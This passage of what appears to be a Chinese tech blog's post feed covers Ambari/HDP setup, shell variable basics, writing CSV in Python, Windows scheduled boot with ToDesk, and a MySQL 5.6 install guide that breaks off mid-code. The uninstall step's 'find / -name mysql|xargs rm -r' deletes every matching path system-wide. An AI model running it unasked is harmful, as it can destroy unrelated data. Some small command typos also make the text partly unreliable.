class="meta">#</span><span class="bash"> 配置</span></span><br><span class="line">vi /etc/ambari-agent/conf/ambari-agent.ini </span><br><span class="line">[server]</span><br><span class="line">hostname=ambari</span><br><span class="line"><span class="meta">#</span><span class="bash">启动</span></span><br><span class="line">ambari-agent start</span><br></pre></td></tr></table></figure><h1 id="7hdp部署"><a class="markdownIt-Anchor" href="#7hdp部署">#</a> 7.HDP 部署</h1><h2 id="71登录"><a class="markdownIt-Anchor" href="#71登录">#</a> 7.1 登录</h2><p>在浏览器中访问 <a href="http://172.18.74.160:8080">http://172.18.74.160:8080</a></p><p>默认的用户名和密码都是 admin</p><p><img "" class="lazyload placeholder" data-original="image-20211009131454796.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009131454796"></p><h2 id="72配置集群"><a class="markdownIt-Anchor" href="#72配置集群">#</a> 7.2 配置集群</h2><p><img "" class="lazyload placeholder" data-original="20201010141301559.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141325856.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="202010101414045.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141418882.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141433923.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141454782.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141535201.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141550200.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141603805.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141621700.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="2020101014164097.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141651804.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141707114.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="image-20211009132110430.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt=""></p><p><img "" class="lazyload placeholder" data-original="image-20211009132042277.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009132042277"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux Shell(一)</title>
      <link href="/2021/09/14/Linux%20Shell/"/>
      <url>/2021/09/14/Linux%20Shell/</url>
      
        <content type="html"><![CDATA[<p>什么是 shell？目前常用的操作系统（Windows、U/L、Android、iOS 等）都带有图形界面，然 而，早期的计算机并没有图形界面，人们只能使用命令来控制计算机。其实，真 正能够控制计算机硬件（CPU、内存、显示器）的只有操作系统内核（Kernel）， 图形界面和命令行都是架设在用户和内核之间的桥梁，是为了方便用户控制计算 机而存在的。Shell 也是一种编程语言，主要用来开发一些实用的、自动化的小工具，例如，检测计算机的硬件参数、搭建 Web 运行环境、日志分析等。对 Linux 运维工程师来说，Shell 更是必须掌握的技能。Shell 使自动化管理服务器集群成为可能，否则用户只能一个一个地登录所有的服务器，对每一台服务器进行相同的设置，而这些服务器可能有成百上千之多，用户会在重复性的工作上浪费大量时间。</p><h3 id="11查看shell版本"><a class="markdownIt-Anchor" href="#11查看shell版本">#</a> 1.1 查看 Shell 版本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /ect/shells</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/sbin/nologin</span><br><span class="line">/usr/bin/sh</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/usr/sbin/nologin</span><br></pre></td></tr></table></figure><h3 id="12-shell变量类型"><a class="markdownIt-Anchor" href="#12-shell变量类型">#</a> 1.2 Shell 变量类型</h3><p>Shell 变量分为四类，分别为自定义变量、环境变量、位置变量和预定义变量。</p><ul><li>根据工作要求临时定义的变量称为自定义变量</li><li>环境变量一般是指用 export 内置命令导出的变量，用于定义 Shell 的运行环境，保证 Shell 命令的正确执行 只使用 不定义</li><li>从命令行、函数或脚本执行等处传递参数时，$0、$1 称为特殊位置变量</li><li>预定义变量是在 bash 中已有的变量，可以直接使用，如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">@</mi><mtext>、</mtext></mrow><annotation encoding="application/x-tex">@、</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">@</span><span class="mord cjk_fallback">、</span></span></span></span>* 等。</li></ul><h4 id="121-自定义变量"><a class="markdownIt-Anchor" href="#121-自定义变量">#</a> 1.2.1 自定义变量</h4><p>自定义变量可以理解为局部变量或普通变量，只能在创建它们的 Shell 函数或 Shell 脚本中使用，自定义变量的说明如表所示。</p><table><thead><tr><th>定义自定义变量</th><th>变量名 = 变量值，字母下划线开头，区分大小写</th></tr></thead><tbody><tr><td>使用自定义变量</td><td>$ 变量名</td></tr><tr><td>查看自定义变量</td><td>echo$ 变量名 set (所有变量)</td></tr><tr><td>取消自定义变量</td><td>unset 变量名</td></tr><tr><td>自定义变量使用范围</td><td>仅在当前 Shell 中有效</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">分支结构</span></span><br><span class="line">host=www.baidu.com</span><br><span class="line">if ping -c1 $host &amp;&gt;/dev/null</span><br><span class="line">then</span><br><span class="line">echo &quot;network ok&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;bad network&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h4 id="122环境变量"><a class="markdownIt-Anchor" href="#122环境变量">#</a> 1.2.2 环境变量</h4><p>环境变量也可称为全局变量，可以在创建它们的 Shell 及其派生出来的任意子进程 Shell 中使用。环境变量的说明如表所示。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看</span></span><br><span class="line">echo $PATH</span><br><span class="line"><span class="meta">#</span><span class="bash">修改</span></span><br><span class="line">PATH=$PATH:/bin/new</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure><h4 id="123位置变量"><a class="markdownIt-Anchor" href="#123位置变量">#</a> 1.2.3 位置变量</h4><p>在 Shell 中存在一些位置变量。位置变量用于在命令行、函数或脚本中传递参数，其变量名不用自己定义，其作用也是固定的。执行脚本时，通过在脚本后面给出具体的参数（多个参数用空格隔开）对相应的位置变量进行赋值。<br>$0 代表命令本身，$1-$9 代表接收的第 1~9 个参数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn><mtext>以上需要用</mtext><mrow></mrow><mtext>括起来，如</mtext></mrow><annotation encoding="application/x-tex">10以上需要用{}括起来，如</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">用</span><span class="mord"></span><span class="mord cjk_fallback">括</span><span class="mord cjk_fallback">起</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span></span></span></span> {10} 代表接收的第 10 个参数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hadoop@master shell]$ cat ping06.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">ping -c1 $1 &amp;&gt;/dev/null</span><br><span class="line"></span><br><span class="line">if [ $? -eq &quot;0&quot; ];then</span><br><span class="line">echo &quot;network to $1 is ok&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;bad network to $1&quot;</span><br><span class="line">fi</span><br><span class="line">[hadoop@master shell]$ sh ping06.sh www.baidu.com</span><br><span class="line">network to www.baidu.com is ok</span><br></pre></td></tr></table></figure><h4 id="124预定义变量"><a class="markdownIt-Anchor" href="#124预定义变量">#</a> 1.2.4 预定义变量</h4><table><thead><tr><th>$0</th><th>脚本名</th></tr></thead><tbody><tr><td>$*</td><td>所有参数</td></tr><tr><td>$@</td><td>所有参数</td></tr><tr><td>$#</td><td>参数的个数</td></tr><tr><td>$$</td><td>当前进程 PID</td></tr><tr><td>$!</td><td>上一个进程 PID</td></tr><tr><td>$?</td><td>上一个命令返回值，0 代表成功</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[hadoop@master shell]$ ls &amp;</span><br><span class="line">[1] 6950</span><br><span class="line">[hadoop@master shell]$ ip.txt  ping03.sh  ping04.sh  ping05.sh  ping06.sh  ping07.sh  read</span><br><span class="line"></span><br><span class="line">[1]+  完成                  ls --color=auto</span><br><span class="line">[hadoop@master shell]$ $!</span><br><span class="line">-bash: 6950: 未找到命令</span><br><span class="line"></span><br><span class="line">[hadoop@master shell]$ cat ping07.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [ $# -eq 0 ];then</span><br><span class="line">echo &quot;usage: `basename $0` filename&quot;</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ ! -f $1 ];then</span><br><span class="line">echo &quot;filename error&quot;</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line">for ip in `cat $1`</span><br><span class="line">do </span><br><span class="line">ping -c1 $ip</span><br><span class="line">done</span><br><span class="line">[hadoop@master shell]$ sh ping07.sh </span><br><span class="line">usage: ping07.sh filename</span><br><span class="line">[hadoop@master shell]$ sh ping07.sh ip.txt </span><br></pre></td></tr></table></figure><h3 id="13变量的赋值"><a class="markdownIt-Anchor" href="#13变量的赋值">#</a> 1.3 变量的赋值</h3><h4 id="131显式赋值"><a class="markdownIt-Anchor" href="#131显式赋值">#</a> 1.3.1 显式赋值</h4><p>在 Shell 中，当第一次使用某变量名时，实际上就已经给变量赋值了。显式赋值的<br>格式为” 变量名 = 变量值”。为了避免歧义，显式赋值时__禁止在等号两边添加空格__，<br>这跟常见的编程语言有所不同。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=3</span><br></pre></td></tr></table></figure><ul><li>变量缺省为字符串类型</li><li>变量值中有空格需要使用引号</li><li>使用变量值进行赋值  name=“welcome to $place”</li></ul><h4 id="132从键盘赋值"><a class="markdownIt-Anchor" href="#132从键盘赋值">#</a> 1.3.2 从键盘赋值</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read -p &quot;Please enter a ip:&quot; ip</span><br><span class="line">Please enter a ip:1.1.1.1</span><br><span class="line">echo $ip</span><br><span class="line">1.1.1.1</span><br></pre></td></tr></table></figure><h4 id="133使用位置变量赋值"><a class="markdownIt-Anchor" href="#133使用位置变量赋值">#</a> 1.3.3 使用位置变量赋值</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat test.sh</span><br><span class="line">echo $1 $2</span><br><span class="line">sh test.sh hello world</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><h4 id="134利用命令替换进行赋值"><a class="markdownIt-Anchor" href="#134利用命令替换进行赋值">#</a> 1.3.4 利用命令替换进行赋值</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">today=`date +%F`</span><br><span class="line">echo today</span><br><span class="line">2021-10-2</span><br><span class="line">touch `date +%F`_file.txt</span><br></pre></td></tr></table></figure><p>双引号弱引用，单引号为强引用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hadoop@master shell]$ cat ping04.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">host=www.baidu.com</span><br><span class="line">ping -c1 $host &amp;&gt;/dev/null</span><br><span class="line">if [ $? -eq 0 ] </span><br><span class="line">then</span><br><span class="line">echo &quot;network to $host is ok&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;bad network to $host&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h3 id="14变量的运算"><a class="markdownIt-Anchor" href="#14变量的运算">#</a> 1.4 变量的运算</h3><h4 id="141expr数值运算命令"><a class="markdownIt-Anchor" href="#141expr数值运算命令">#</a> 1.4.1.expr 数值运算命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo 1 + 3</span><br><span class="line">1 + 3</span><br><span class="line">expr 1 + 3</span><br><span class="line">4</span><br><span class="line">res = `expr $name1 \* $name2`</span><br><span class="line">echo $res</span><br></pre></td></tr></table></figure><ul><li>在使用 expr 时，需要注意运算符及用于计算的数字两边必须有空格，否则会执行失败。</li><li>expr 支持乘法运算，在使用乘号 * 时必须用反斜杠转义，即 \*</li></ul><h4 id="142或数值运算命令"><a class="markdownIt-Anchor" href="#142或数值运算命令">#</a> 1.4.2.“$(())” 或 “[]” 数值运算命令</h4><ul><li>双小括号 “$(())” 的作用是进行整数运算和数值比较，格式为 “ ((表达式))”</li><li>操作数、运算符两侧可以有空格</li><li>括号内 $ 符合可省略</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">num1=10</span><br><span class="line">num2=20</span><br><span class="line">sum=$((num1+num2))</span><br><span class="line">echo $sum</span><br><span class="line">30</span><br><span class="line">sum=$[ num1+num2 ]</span><br><span class="line">echo $sum</span><br><span class="line"><span class="meta">#</span><span class="bash">可以使用加减乘除幂</span></span><br></pre></td></tr></table></figure><h4 id="143let数值运算命令"><a class="markdownIt-Anchor" href="#143let数值运算命令">#</a> 1.4.3.let 数值运算命令</h4><ul><li>let 数值符号可以直接进行计算，不需要使用 $ 符号。</li><li>let 运算命令的语法格式为：let 赋值表达式</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let num=1+2</span><br><span class="line">echo $num</span><br><span class="line">3</span><br><span class="line"><span class="meta">#</span><span class="bash">调试模式</span></span><br><span class="line">bash -vx test.sh</span><br></pre></td></tr></table></figure><h4 id="144shell小数运算"><a class="markdownIt-Anchor" href="#144shell小数运算">#</a> 1.4.4Shell 小数运算</h4><ul><li>bc 是 Unix/Linux 下的计算器，它还可以作为命令进行小数运算。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;2^4&quot;|bc</span><br><span class="line">16</span><br><span class="line">echo &quot;scale=2;6/4&quot;|bc</span><br><span class="line">1.50</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 平台 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建立CSV</title>
      <link href="/2021/07/20/%E5%BB%BA%E7%AB%8BCSV/"/>
      <url>/2021/07/20/%E5%BB%BA%E7%AB%8BCSV/</url>
      
        <content type="html"><![CDATA[<h1 id="建立csv"><a class="markdownIt-Anchor" href="#建立csv">#</a> 建立 CSV</h1><p>环境</p><ul><li>pyCharm</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="comment">#获得一个文件对象</span></span><br><span class="line">csvFile = <span class="built_in">open</span>(<span class="string">&quot;test.csv&quot;</span>, <span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="comment">#返回一个编写器对象，负责将用户的数据转换为给定类文件对象上的分隔字符串</span></span><br><span class="line">   writer = csv.writer(csvFile)</span><br><span class="line">   <span class="comment">#调用编写器对象将行参数写入文件对象</span></span><br><span class="line">   writer.writerow((<span class="string">&#x27;number&#x27;</span>, <span class="string">&#x27;number plus 2&#x27;</span>, <span class="string">&#x27;number times 2&#x27;</span>))</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">   <span class="comment">#调用编写器对象将行参数写入文件对象</span></span><br><span class="line">      writer.writerow( (i, i+<span class="number">2</span>, i*<span class="number">2</span>))</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">   <span class="comment">#关闭文件</span></span><br><span class="line">   csvFile.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 定时开机、联网、打开远程服务</title>
      <link href="/2021/06/21/Windows%20%E5%AE%9A%E6%97%B6%E5%BC%80%E6%9C%BA%E3%80%81%E8%81%94%E7%BD%91%E3%80%81%E6%89%93%E5%BC%80%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/"/>
      <url>/2021/06/21/Windows%20%E5%AE%9A%E6%97%B6%E5%BC%80%E6%9C%BA%E3%80%81%E8%81%94%E7%BD%91%E3%80%81%E6%89%93%E5%BC%80%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="windows-定时开机-联网-打开远程服务"><a class="markdownIt-Anchor" href="#windows-定时开机-联网-打开远程服务">#</a> Windows 定时开机、联网、打开远程服务</h1><p>作者：SSR</p><h2 id="设置定时任务"><a class="markdownIt-Anchor" href="#设置定时任务">#</a> 设置定时任务</h2><ol><li>右键此电脑 &gt; 管理 &gt; 任务计划程序 &gt; 任务计划库</li><li>在右侧创建任务<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621172358836.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621172358836"></li><li>输入事件名称，选择不管是否登陆都要执行（关键！确保开机不登录也运行）<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621172519107.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621172519107"></li><li>添加触发器 1，选择启动时<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621172654148.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621172654148"></li><li>添加触发器 2，选择每日特定时间<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621172812758.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621172812758"></li><li>添加操作并指定联网脚本（理论上 java、python 都随意，这里使用批处理脚本）<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621172957100.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621172957100"></li><li>添加操作，指定打开远程连接软件 ToDesk (<a href="http://www.todesk.com">www.todesk.com</a>)<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621173149721.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621173149721"></li><li>点击确定完成设置</li></ol><h2 id="设置bios启动"><a class="markdownIt-Anchor" href="#设置bios启动">#</a> 设置 BIOS 启动</h2><ol><li>打开开始 &gt; 设置 &gt; 更新和安全 &gt; 恢复 &gt; 立即重新启动 &gt; 疑难解答 &gt; 高级选项 &gt; UEFI 固件设置 &gt; 重启</li><li>找到电池选项，修改如下，保存开机<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5CIMG_20210621_164601.jpg" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="IMG_20210621_164601"></li></ol><h2 id="验证"><a class="markdownIt-Anchor" href="#验证">#</a> 验证</h2><p>一气呵成，简直完美</p>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装mysql_5.6.33 linux_64位</title>
      <link href="/2021/06/21/%E5%AE%89%E8%A3%85mysql_5.6.33%20linux_64%E4%BD%8D/"/>
      <url>/2021/06/21/%E5%AE%89%E8%A3%85mysql_5.6.33%20linux_64%E4%BD%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="安装mysql_5633-linux_64位"><a class="markdownIt-Anchor" href="#安装mysql_5633-linux_64位">#</a> 安装 mysql_5.6.33 linux_64 位</h1><h2 id="环境及软件"><a class="markdownIt-Anchor" href="#环境及软件">#</a> 环境及软件</h2><pre><code>* Centos7* mysql_5.6.33 linux_64位* wget http://dev.mysql.com/get/Downloads/MySQL-5.6/mysql-5.6.33-linux-glibc2.5-x86_64.tar.gz</code></pre><h2 id="安装流程"><a class="markdownIt-Anchor" href="#安装流程">#</a> 安装流程</h2><h3 id="1-卸载老版本"><a class="markdownIt-Anchor" href="#1-卸载老版本">#</a> 1. 卸载老版本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name mysql</span><br><span class="line">rm -rf 上边查找到的路径，多个路径用空格隔开</span><br><span class="line"><span class="meta">#</span><span class="bash">或者下边一条命令即可</span></span><br><span class="line">find / -name mysql|xargs rm -r</span><br></pre></td></tr></table></figure><h3 id="2-解压安装包到usrlocal"><a class="markdownIt-Anchor" href="#2-解压安装包到usrlocal">#</a> 2. 解压安装包到 /usr/local</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf mysql-5.6.33-linux-glibc2.5-x86_64.tar.gz -C /usr/local</span><br></pre></td></tr></table></figure><h3 id="3-重命名文件夹"><a class="markdownIt-Anchor" href="#3-重命名文件夹">#</a> 3. 重命名文件夹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local</span><br><span class="line">mv mysql-5.6.33-linux-glibc2.5-x86_64/ mysql</span><br></pre></td></tr></table></figure><h3 id="4-添加mysql用户组和用户名"><a class="markdownIt-Anchor" href="#4-添加mysql用户组和用户名">#</a> 4. 添加 mysql 用户组和用户名</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">groupadd mysql</span><br><span class="line">useradd -r -g mysql mysql</span><br><span class="line">groups mysql</span><br></pre></td></tr></table></figure><h3 id="5-更改文件夹权限"><a class="markdownIt-Anchor" href="#5-更改文件夹权限">#</a> 5. 更改文件夹权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd mysql/</span><br><span class="line">chown -R mysql:mysql ./</span><br></pre></td></tr></table></figure><h3 id="6-执行安装脚本"><a class="markdownIt-Anchor" href="#6-执行安装脚本">#</a> 6. 执行安装脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./scripts/mysql_install_db --user=mysql</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装完执行下列语句修改权限</span></span><br><span class="line">chown -R root:root ./</span><br><span class="line">chown -R mysql:mysql data</span><br></pre></td></tr></table></figure><h3 id="7-更改数据库密码"><a class="markdownIt-Anchor" href="#7-更改数据库密码">#</a> 7. 更改数据库密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 